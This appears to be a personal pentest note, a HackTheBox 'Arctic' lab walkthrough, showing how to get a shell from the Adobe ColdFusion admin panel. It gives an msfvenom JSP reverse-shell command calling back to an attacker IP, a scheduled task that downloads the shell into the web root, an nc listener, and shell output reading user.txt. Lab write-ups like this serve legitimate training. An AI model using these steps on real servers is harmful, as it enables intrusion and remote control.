<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Get shell from Admin Panel</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port 8500 - Adobe ColdFusion - Get shell from Admin Panel</h1></strong><br />From the Adobe ColdFusion administrator panel, you can get a system shell by Scheduling a New Task and having it download a shell from your attacking system.<br /><br />If it&#39;s Windows - use a <code>.jsp</code> shell?<br />If it&#39;s Linux - use either <code>.jsp</code> or <code>.cfm</code>?<br />I&#39;m not actually sure.<br /><br /><strong>Example below is from </strong><em><strong>hackthebox Arctic</strong></em><br /><br /><strong><h3>a) Create .jsp shell and serve it</h3></strong><br />First, generate a <code>.jsp</code> shell on your attacking machine using <code>msfvenom</code>.<br />(with ColdFusion, you can use either a <code>.cfm</code> shell or a <code>.jsp</code> shell)<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/arctic#&nbsp;msfvenom&nbsp;-p&nbsp;java/jsp_shell_reverse_tcp&nbsp;LHOST=10.10.14.8&nbsp;LPORT=9001&nbsp;-f&nbsp;raw&nbsp;-o&nbsp;shell.jsp<br />Payload&nbsp;size:&nbsp;1496&nbsp;bytes<br />Saved&nbsp;as:&nbsp;shell.jsp</div></div><br /><br />And serve it to Adobe ColdFusion using <code>python -m SimpleHTTPServer</code><br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/arctic#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br />Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...</div></div><br /><br /><strong><h3>b) Find shell upload location</h3></strong><br />Next we need to find where the shell will be uploaded to.<br /><br />Back on the ColdFusion panel, browse to Server Settings &gt; Mappings.<br /><a href=""><img src="images/148-1.png" alt="images/148-1.png" /></a><br /><br />You&#39;ll see the <code>/CFIDE</code> Logical Path, which points to the <code>C:\ColdFusion8\wwwroot\CFIDE</code> directory path.<br />This directory is where our shell will be uploaded to.<br /><a href=""><img src="images/148-2.png" alt="images/148-2.png" /></a><br /><br /><strong><h3>c) Create scheduled task to download shell</h3></strong><br />Now we need to create scheduled task to download the shell to the system.<br /><br />You can set a Scheduled Task that will download a file from a remote server and save it to a directory on the system.<br />i.e. You set a task that will download a reverse shell from your attacking machine and save it to <code>C:\ColdFusion8\wwwroot\CFIDE</code> on the target system.<br /><br />Go to Debugging &amp; Logging &gt; Scheduled Tasks. <br /><a href=""><img src="images/148-3.png" alt="images/148-3.png" /></a><br /><br />Click <code>Schedule New Task</code><br /><a href=""><img src="images/148-4.png" alt="images/148-4.png" /></a><br /><br />• Enter any Task Name you want.<br />• In <code>URL</code> - input the URL of the shell being served by your attacking system.<br />• Enter the admin username and password in <code>User Name</code> and <code>Password</code><br />• Tick <code>Publish</code>&#39;s <code>Save output to a file</code> option.<br />• And in <code>File</code> - input the CFIDE path from Mappings - <code>C:\ColdFusion8\wwwroot\CFIDE\&lt;shell&gt;</code><br /><br />Click <code>Submit</code><br /><a href=""><img src="images/148-5.png" alt="images/148-5.png" /></a><br /><br />Run the scheduled task by clicking the far left button.<br /><a href=""><img src="images/148-6.png" alt="images/148-6.png" /></a><br /><br />You should see a message saying that the task was completed successfully.<br /><a href=""><img src="images/148-7.png" alt="images/148-7.png" /></a><br /><br />As well as a hit on your python server, which means that the shell has been downloaded to the target.<br /><div class="codebox"><div class="codebox">...<br />Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...<br />10.10.10.11&nbsp;-&nbsp;-&nbsp;[30/Aug/2019&nbsp;13:29:26]&nbsp;&quot;GET&nbsp;/shell.jsp&nbsp;HTTP/1.1&quot;&nbsp;200&nbsp;-</div></div><br /><br /><strong><h3>d) Run reverse shell</h3></strong><br />Activate your shell by visiting <code>http://10.10.10.11/CFIDE/shell.jsp</code><br /><br />You should get a connection on your listener and a shell!<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/arctic#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br />listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br />connect&nbsp;to&nbsp;[10.10.14.8]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.11]&nbsp;49775<br />Microsoft&nbsp;Windows&nbsp;[Version&nbsp;6.1.7600]<br />Copyright&nbsp;(c)&nbsp;2009&nbsp;Microsoft&nbsp;Corporation.&nbsp;&nbsp;All&nbsp;rights&nbsp;reserved.<br /><br />C:\ColdFusion8\runtime\bin&gt;</div></div><br /><br />Go grab <code>user.txt</code>.<br /><div class="codebox"><div class="codebox">C:\ColdFusion8\runtime\bin&gt;dir&nbsp;C:\Users<br />dir&nbsp;C:\Users<br />&nbsp;Volume&nbsp;in&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br />&nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;F88F-4EA5<br /><br />&nbsp;Directory&nbsp;of&nbsp;C:\Users<br /><br />22/03/2017&nbsp;&nbsp;10:00&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<br />22/03/2017&nbsp;&nbsp;10:00&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..<br />22/03/2017&nbsp;&nbsp;09:10&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Administrator<br />14/07/2009&nbsp;&nbsp;07:57&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Public<br />22/03/2017&nbsp;&nbsp;10:00&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tolis<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;bytes<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Dir(s)&nbsp;&nbsp;33.193.164.800&nbsp;bytes&nbsp;free<br /><br />C:\ColdFusion8\runtime\bin&gt;type&nbsp;C:\Users\tolis\Desktop\user.txt<br />type&nbsp;C:\Users\tolis\Desktop\user.txt<br />02650d...</div></div><br /></div>
</body>
</html>
